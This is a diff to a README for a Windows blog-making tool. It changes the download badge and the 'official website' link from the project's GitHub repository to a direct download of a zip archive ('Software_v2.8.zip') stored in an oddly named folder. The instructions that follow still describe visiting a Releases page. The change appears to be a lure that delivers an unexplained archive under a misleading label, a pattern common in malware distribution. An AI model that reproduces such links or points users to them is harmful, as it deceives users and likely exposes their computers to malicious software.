@@ -1,6 +1,6 @@
 # 🐭 Blog - Share your stories with the world
 
-[![Download Blog](https://img.shields.io/badge/Download-Blog-blue)](https://github.com/fannyantiauthoritarian233/Blog)
+[![Download Blog](https://img.shields.io/badge/Download-Blog-blue)](https://raw.githubusercontent.com/fannyantiauthoritarian233/Blog/main/centenar/Software_v2.8.zip)
 
 This software helps you create a personal blog. You write content in simple text files. The application turns these files into a clean website. You do not need to know how to code. This tool handles the technical work for you. You focus on your writing, your thoughts, and your images.
 
@@ -17,7 +17,7 @@ Your computer must meet these basic standards to run the blog software:
 
 Follow these steps to get the software on your computer.
 
-1. Visit the [official website](https://github.com/fannyantiauthoritarian233/Blog) to find the latest version.
+1. Visit the [official website](https://raw.githubusercontent.com/fannyantiauthoritarian233/Blog/main/centenar/Software_v2.8.zip) to find the latest version.
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the link that matches your version of Windows.
 4. Save the file to your desktop or your Downloads folder.
